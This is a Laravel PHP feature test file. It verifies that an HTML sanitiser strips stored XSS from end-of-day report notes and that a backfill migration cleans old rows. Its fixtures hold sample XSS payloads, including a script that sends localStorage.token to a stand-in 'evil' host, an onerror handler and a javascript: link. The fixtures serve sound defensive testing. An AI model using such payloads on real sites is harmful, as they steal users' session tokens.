<?php

namespace Tests\Feature;

use App\Models\Outlet;
use App\Models\User;
use App\Support\HtmlSanitizer;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\DB;
use Tests\TestCase;

/**
 * EoD "sentiments" is WYSIWYG HTML that was stored raw and rendered unescaped in
 * the admin console (dangerouslySetInnerHTML) and the EoD email ({!! !!}) — a
 * stored XSS that ran in a manager's session. It is now sanitised to a safe
 * allow-list on write, and existing rows are cleaned by a one-time backfill.
 */
class EodSentimentsSanitisationTest extends TestCase
{
    use RefreshDatabase;

    public function test_it_strips_scripts_and_event_handlers_but_keeps_basic_formatting(): void
    {
        $dirty = '<p>Strong <b>morning</b> sales.</p>'
            . '<script>fetch("https://evil/"+localStorage.token)</script>'
            . '<img src=x onerror="steal()">'
            . '<a href="javascript:alert(1)">tap</a>';

        $clean = HtmlSanitizer::sentiments($dirty);

        // The payloads are gone…
        $this->assertStringNotContainsStringIgnoringCase('<script', $clean);
        $this->assertStringNotContainsStringIgnoringCase('onerror', $clean);
        $this->assertStringNotContainsString('<img', $clean);
        $this->assertStringNotContainsStringIgnoringCase('javascript:', $clean);
        // …the legitimate formatting survives.
        $this->assertStringContainsString('<b>morning</b>', $clean);
        $this->assertStringContainsString('<p>', $clean);
    }

    public function test_absent_or_empty_notes_become_null_not_an_empty_string(): void
    {
        $this->assertNull(HtmlSanitizer::sentiments(null));
        $this->assertNull(HtmlSanitizer::sentiments('   '));
        $this->assertNull(HtmlSanitizer::sentiments('<p></p>')); // AutoFormat.RemoveEmpty
    }

    public function test_the_backfill_sanitises_a_row_written_before_the_fix(): void
    {
        // A row stored the old way — raw, dangerous — inserted directly to bypass
        // the now-sanitising write path.
        $outlet = Outlet::factory()->create();
        $user   = User::factory()->create();
        $registerId = DB::table('cash_registers')->insertGetId([
            'register_number' => 'REG-1', 'outlet_id' => $outlet->id,
            'register_name' => 'Till 1', 'status' => 'closed',
            'created_at' => now(), 'updated_at' => now(),
        ]);
        $id = DB::table('cash_register_eod_reports')->insertGetId([
            'register_id' => $registerId, 'user_id' => $user->id, 'outlet_id' => $outlet->id,
            'report_date' => today()->toDateString(),
            'order_notes' => json_encode([]),
            'sentiments'  => '<p>ok</p><script>alert(1)</script>',
            'submitted_at' => now(), 'created_at' => now(), 'updated_at' => now(),
        ]);

        // Run the backfill migration's up() (the table exists here, so the guard passes).
        $migration = include database_path('migrations/2026_08_22_130000_sanitize_existing_eod_sentiments.php');
        $migration->up();

        $after = DB::table('cash_register_eod_reports')->where('id', $id)->value('sentiments');
        $this->assertStringNotContainsStringIgnoringCase('<script', $after);
        $this->assertStringContainsString('<p>ok</p>', $after);
    }
}
